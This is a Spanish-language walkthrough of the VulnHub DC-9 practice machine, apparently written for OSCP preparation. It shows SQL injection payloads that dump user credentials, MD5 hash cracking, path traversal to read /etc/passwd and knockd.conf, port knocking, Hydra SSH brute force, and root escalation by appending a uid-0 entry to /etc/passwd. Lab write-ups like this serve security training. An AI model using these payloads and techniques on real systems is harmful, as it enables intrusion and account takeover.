# DC-9 Walkthrough

Pagina de la maquina: [https://www.vulnhub.com/entry/dc-9,412/](https://www.vulnhub.com/entry/dc-9,412/)

Enlace de descarga:  [https://download.vulnhub.com/dc/DC-9.zip](https://download.vulnhub.com/dc/DC-9.zip)

Dc-9 es una de las maquinas de [vulnhub](https://www.vulnhub.com/) que contiene el listado de [Tjnull](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0), el cual es un listado creado para prepararse el examen del OSCP, esta maquina es la primera de la lista con un nivel similar a las maquinas del curso que el OSCP ofrece.

## Escaneo de la Red

El primer paso es encontrar la ip de nuestro objetivo, para ello utilizamos Arp-Scan, esta herramienta permite escanear una red LAN y descubrir dispositivos conectados en ella.

```bash
sudo arp-scan -interface eth1 -l
```

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled.png)

Hemos descubierto que la ip de nuestro objetivo es la 192.168.34.5.

Una vez obtenida la ip pasamos a un escaneo de puertos y servicios con nmap.

```bash
sudo nmap -sV  192.168.34.5
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-17 19:06 CEST
Nmap scan report for example.com (192.168.34.5)
Host is up (0.00052s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.38 ((Debian))
MAC Address: 08:00:27:C1:23:27 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.83 seconds
```

Vemos que el puerto 80 esta abierto y corre un Apache con versión 2.4.38. También vemos que el puerto ssh esta filtrado pero poco se puede hacer con la información que tenemos hasta ahora por lo que pasamos a ver la web en el puerto 80.

## Enumeración

Navegando por la web veo que hay un campo ‘search’ que realiza una búsqueda de los usuarios de la compañia. Lo primero que se me ocurre es probar si es vulnerable a sqli por lo que introduzco la siguiente consulta:

```sql
Mary ' or 1=1-- -
```

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%201.png)

Y veo que es vulnerable a sqli por lo que paso a obtener información de la base de datos.

Primero obtengo el numero de columnas añadiendo el valor null por cada columna hasta que obtenga respuesta con la siguiente consulta:

```bash
Mary' union select null,null,null,null,null,null-- -
```

Después paso a listar las bases de datos que hay, con la siguiente consulta:

```sql
Mary' union select null,schema_name,null,null,null,null from information_schema.schemata-- -
```

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%202.png)

Vemos que existen las bases de datos Staff y users.

El siguiente paso que realizo es listar las tablas que contiene la base de datos users

```sql
Mary' union select null,table_name,null,null,null,null from information_schema.tables where table_schema='users'-- -

```

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%203.png)

Y veo que existe la tabla UserDetails, después paso a listar las columnas de esta tabla.

```sql
Mary' union select null,column_name,null,null,null,null from information_schema.columns where table_name='UserDetails'-- -

```

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%204.png)

Obtengo las columnas id, firstname, lastname, username, password, y reg_date, por lo que solo queda listar el contenido de las columnas. con la siguiente consulta indico que se muestre los valores de las columnas username y password indicando la tabla que pertenece a la base de datos users.

```sql
Mary' union select  null,CONCAT(username, ":" ,password),null,null,null,null from users.UserDetails-- -
```

```bash
marym:3kfs86sfd
julied:468sfdfsd2
fredf:4sfd87sfd1
barneyr:RocksOff
tomc:TC&TheBoyz
jerrym:B8m#48sd
wilmaf:Pebbles
bettyr:BamBam01
chandlerb:UrAG0D!
joeyt:Passw0rd
rachelg:yN72#dsd
rossg:ILoveRachel
monicag:3248dsds7s
phoebeb:smellycats
scoots:YR3BVxxxw87
janitor:Ilovepeepee
janitor2:Hawaii-Five-0
```

Guardo las credenciales en un fichero llamado creds.

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%205.png)

Obtenemos un listado de usuarios y contraseñas pero no son validas en el login de la web por lo que pasamos a enumerar la base de datos Staff de la misma forma que hemos hecho con users.

```sql
Mary' union select null,table_name,null,null,null,null from information_schema.tables where table_schema='Staff'-- -
```

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%206.png)

```sql
Mary' union select null,column_name,null,null,null,null from information_schema.columns where table_name='Users'-- -

```

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%207.png)

```sql
Mary' union select null,CONCAT(username,':',password),null,null,null,null from Users-- -
```

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%208.png)

Obtenemos usuario admin y un hash md5. Con el hash paso a crackearlo en una web online

[https://crackstation.net/](https://crackstation.net/)

```sql
admin:856f5de590ef37314e7c3bdf6f8a66dc
```

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%209.png)

Y obtengo la contraseña: **transorbital1**

## Explotación 

Inicio sesion

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2010.png)

Tras iniciar sesión observamos un apartado en la parte inferior de la pagina que dice File does not exist, parece que intenta cargar un archivo pero no existe, esto me hace pensar que puede que este buscando un archivo en alguna ruta del sistema por lo que pruebo lo siguiente.

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2011.png)

```bash
http://192.168.34.5/manage.php?file=../../../../../../../etc/passwd
```

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2012.png)

Tenemos exito, en el escaneo con nmap descubrimos que el puerto ssh estaba filtrado y lo que me viene a la cabeza es la tecnica de Port Knocking por lo que voy a ver los archivos de configuración de Knock

```bash
http://192.168.34.5/manage.php?file=../../../../../../../etc/knockd.conf
```

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2013.png)

Obtenemos la secuencia para introducir con knock

```bash
knock -v 192.168.34.5 7469 8475 9842
hitting tcp 192.168.34.5:7469
hitting tcp 192.168.34.5:8475
hitting tcp 192.168.34.5:9842
```

Compruebo que el puerto se haya abierto

```bash
nmap -sV 192.168.34.5               
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-17 19:20 CEST
Nmap scan report for example.com (192.168.34.5)
Host is up (0.00012s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
MAC Address: 08:00:27:C1:23:27 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.54 seconds
```

con los usuarios obtenidos anteriormente realizo un ataque de fuerza bruta con hydra

creo fichero con usuarios

```bash
cat creds | cut -d ':' -f1 > users.txt
```

Creo fichero passwords

```bash
cat creds | cut -d ':' -f2 > passwords.txt
```

```bash
hydra -L users.txt -P passwords.txt 192.168.34.5 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-23 13:27:05
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 289 login tries (l:17/p:17), ~19 tries per task
[DATA] attacking ssh://192.168.34.5:22/
[22][ssh] host: 192.168.34.5   login: chandlerb   password: UrAG0D!
[22][ssh] host: 192.168.34.5   login: joeyt   password: Passw0rd
[22][ssh] host: 192.168.34.5   login: janitor   password: Ilovepeepee
[STATUS] 287.00 tries/min, 287 tries in 00:01h, 4 to do in 00:01h, 14 active
1 of 1 target successfully completed, 3 valid passwords found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-23 13:28:08
```

```bash
chandlerb:UrAG0D
joeyt:Passw0rd
janitor:Ilovepeepee
```

Inicio sesión como janitor

```bash	
ssh janitor@192.168.34.5
```

Enumerando encontramos el siguiente directorio

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2014.png)

Dentro encontramos el fichero passwords-found-on-post-it-notes.txt con las siguientes passwords

```bash
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
```

realizo un nuevo ataque de fuerza bruta con las passwords obtenidas

```bash
hydra -L users.txt -P newpasswords 192.168.34.5 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-17 20:34:37
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 102 login tries (l:17/p:6), ~7 tries per task
[DATA] attacking ssh://192.168.34.5:22/
[22][ssh] host: 192.168.34.5   login: fredf   password: B4-Tru3-001
[22][ssh] host: 192.168.34.5   login: joeyt   password: Passw0rd
1 of 1 target successfully completed, 2 valid passwords found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-17 20:34:58
```
## Escalada de Privilegios

Inicio de sesión como fredf

```bash
ssh fredf@192.168.34.5
```

Ejecutamos sudo -l y vemos que tenemos permisos para ejecutar el siguiente script

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2015.png)

lo ejecuto para ver como funciona

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2016.png)

Parece que se le introducen dos ficheros el primero que lee y el segundo al que es añadido el  contenido del primero por lo que para escalar privilegios voy a crear un usuario y lo voy a añadir al archivo passwd

Creación del hash del usuario (Password 123)

```bash
openssl passwd -1
$1$buZKpXN3$NPI6IUJkJTJKQTwGdqfyo1
```

Creamos un fichero con lo siguiente (user.txt)

```bash
user:$1$buZKpXN3$NPI6IUJkJTJKQTwGdqfyo1:0:0:user:/root:/bin/bash
```

Ejecutamos script

```bash
sudo /opt/devstuff/dist/test/test user.txt /etc/passwd
```

cambiamos al nuevo usuario como root

```html
fredf@dc-9:~$ su user
Password: 
root@dc-9:/home/fredf# whoami
root
```

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2017.png)

Y eso es todo

Happy Hacking!

